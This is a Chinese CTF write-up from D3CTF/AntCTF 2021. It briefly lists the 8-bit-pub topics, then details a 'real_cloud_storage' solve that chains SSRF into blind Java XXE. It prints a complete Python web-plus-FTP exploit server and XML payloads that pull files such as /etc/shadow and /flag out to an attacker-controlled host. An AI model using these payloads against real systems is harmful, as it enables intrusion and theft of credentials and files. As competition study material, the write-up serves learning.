---
title: "D3ctf^antctf2021复现"
date: 2021-03-10T14:18:14+08:00
draft: true
image: https://cdn.jsdelivr.net/gh/Anthem-whisper/imgbed/img/20210311143228.png
description: 
categories: 
- ctf_writeup
tags:
- XXE
- 原型链污染
- NodeJS
---

### 8-bit-pub

考点：json sqli、绕过\__proto__、原型链污染、sendmail参数注入

给了源码：[source.zip](https://github.com/Anthem-whisper/CTFWEB_sourcecode/raw/main/D3ctf%5EAntctf/%5BD3ctf%5EAntctf%5D8-bit-hub/8-bit_pub.zip)

打开VSCode，审计，主要功能点在`controller/userController.js`（登陆注册）和`controller/adminController.js`（发送邮件），不过在调用adminController之前会调用`utils/auth.js`进行鉴权。



### real_cloud_storage

考点：Java-XXE盲打+SSRF

![image-20210310204312081](https://cdn.jsdelivr.net/gh/Anthem-whisper/imgbed/img/20210311114541.png)

题目是一个文件上传的服务，抓包观察，上传会向第二个服务端POST数据，然后第二个服务端会对第三个服务端PUT请求。

可以更改我们发起的POST参数让第二个服务端像我们自己的VPS发送PUT请求数据：

![image-20210310204711368](https://cdn.jsdelivr.net/gh/Anthem-whisper/imgbed/img/20210311114549.png)

修改之后我们能收到一个来自第二个服务端的PUT请求：

![image-20210310200933160](https://cdn.jsdelivr.net/gh/Anthem-whisper/imgbed/img/20210311114554.png)

我们可以仿照这个请求，对第三个服务端直接发起请求：

![image-20210310205313565](https://cdn.jsdelivr.net/gh/Anthem-whisper/imgbed/img/20210311114600.png)

返回了一个XML的报错信息；

按照逻辑，第二个服务端肯定会解析第三个服务端返回的信息，然后返回第一个服务端再返回给给客户端，既然解析了xml那么就有可能存在xxe。

事实上，如果去查看nos-sdk-java的源码的话，也可以发现确实是存在解析这个操作。https://github.com/NetEase-Object-Storage/nos-java-sdk

倘若我们控制这个返回信息，让第二个服务端加载我们的外部实体，就有可能读取这台机器上的文件。

接下来就是Java的xxe盲打，这在X1cT34m第二次考核遇见过，利用ftp外带信息。

直接上exp：

```python
#!/usr/bin/env python

import SocketServer
from threading import Thread
from time import sleep
import logging
from sys import argv

logging.basicConfig(filename='server-xxe-ftp.log',level=logging.DEBUG)

"""
The XML Payload you should send to the server!
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE data [
  <!ENTITY % file SYSTEM "file:///etc/shadow">
  <!ENTITY % dtd SYSTEM "http://x.x.x.x:8888/evil.dtd">
  %dtd;
]>
<data>&send;</data>
"""

payload = """<!ENTITY % all "<!ENTITY send SYSTEM 'ftp://{}:{}/%file;'>">
%all;"""

def wlog(_str):
    print _str
    logging.info("{}\n".format(_str))

class WebServer(SocketServer.BaseRequestHandler):
    """
    Request handler for our webserver.
    """

    def handle(self):
        """
        Blanketly return the XML payload regardless of who's asking.
        """
        resp = """HTTP/1.1 200 OK\r\nContent-Type: application/xml\r\nContent-length: {}\r\n\r\n{}\r\n\r\n""".format(len(payload), payload)
        # self.request is a TCP socket connected to the client
        self.data = self.request.recv(4096).strip()
        wlog("[WEB] {} Connected and sent:".format(self.client_address[0]))
        wlog("{}".format(self.data))
        # Send back same data but upper
        self.request.sendall(resp)
        wlog("[WEB] Replied with:\n{}".format(resp))

class FTPServer(SocketServer.BaseRequestHandler):
    """
    Request handler for our ftp.
    """

    def handle(self):
        """
        FTP Java handler which can handle reading files
        and directories that are being sent by the server.
        """
        # set timeout
        self.request.settimeout(10)
        wlog("[FTP] {} has connected".format(self.client_address[0]))
        self.request.sendall("220 xxe-ftp-server\n")
        try:
            while True:
                self.data = self.request.recv(4096).strip()
                wlog("[FTP] Received:\n{}".format(self.data))
                if "LIST" in self.data:
                    self.request.sendall("drwxrwxrwx 1 owner group          1 Feb 21 04:37 rsl\n")
                    self.request.sendall("150 Opening BINARY mode data connection for /bin/ls\n")
                    self.request.sendall("226 Transfer complete.\n")
                elif "USER" in self.data:
                    self.request.sendall("331 password please - version check\n")
                elif "PORT" in self.data:
                    wlog("[FTP] ! PORT received")
                    wlog("[FTP] > 200 PORT command ok")
                    self.request.sendall("200 PORT command ok\n")
                elif "SYST" in self.data:
                    self.request.sendall("215 RSL\n")
                else:
                    wlog("[FTP] > 230 more data please!")
                    self.request.sendall("230 more data please!\n")
        except Exception, e:
            if "timed out" in e:
                wlog("[FTP] Client timed out")
            else:
                wlog("[FTP] Client error: {}".format(e))
        wlog("[FTP] Connection closed with {}".format(self.client_address[0]))

def start_server(conn, serv_class):
    server = SocketServer.TCPServer(conn, serv_class)
    t = Thread(target=server.serve_forever)
    t.daemon = True
    t.start()
    
if __name__ == "__main__":
    if not argv[1]:
        print "[-] Need public IP of this server in order to receive data."
        exit(1)
    WEB_ARGS = ("0.0.0.0", 8888)
    FTP_ARGS = ("0.0.0.0", 2121)
    payload = payload.format(argv[1],FTP_ARGS[1])
    wlog("[WEB] Starting webserver on %s:%d..." % WEB_ARGS)
    start_server(WEB_ARGS, WebServer)
    wlog("[FTP] Starting FTP server on %s:%d..." % FTP_ARGS)
    start_server(FTP_ARGS, FTPServer)
    try:
        while True:
            sleep(10000)
    except KeyboardInterrupt, e:
        print "\n[+] Server shutting down."#   
```

运行脚本，然后让控制返回信息，使用郭院士推荐的：https://requestrepo.com/

返回的信息：

```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE data [
  <!ENTITY % file SYSTEM "file:///flag">
  <!ENTITY % dtd SYSTEM "http://1xx.xx.xx.5:8888/evil.dtd">
  %dtd;
]>
<data>&send;</data>

```

就可以收到flag了：

![image-20210310222506300](https://cdn.jsdelivr.net/gh/Anthem-whisper/imgbed/img/20210311114607.png)

其实这题不算难，关键点在于你能不能想到第二个服务端会解析返回的xml信息，当然去审计源码也是可以的。